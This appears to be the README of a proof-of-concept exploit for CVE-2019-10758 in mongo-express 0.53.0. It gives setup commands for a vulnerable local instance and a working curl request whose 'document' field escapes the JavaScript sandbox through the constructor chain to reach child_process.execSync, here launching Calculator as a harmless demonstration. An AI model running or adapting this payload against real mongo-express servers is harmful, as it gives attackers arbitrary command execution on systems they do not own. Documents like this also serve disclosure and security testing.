# CVE-2019-10758 PoC


## Setup

```
docker run -p 27017:27017 -d mongo
npm install mongo-express@0.53.0 
cd node_modules/mongo-express/ && node app.js
```

## cURL exploit
```
curl 'http://localhost:8081/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw=='  --data 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("/Applications/Calculator.app/Contents/MacOS/Calculator")'
```

## Script exploit
```
node main.js
```
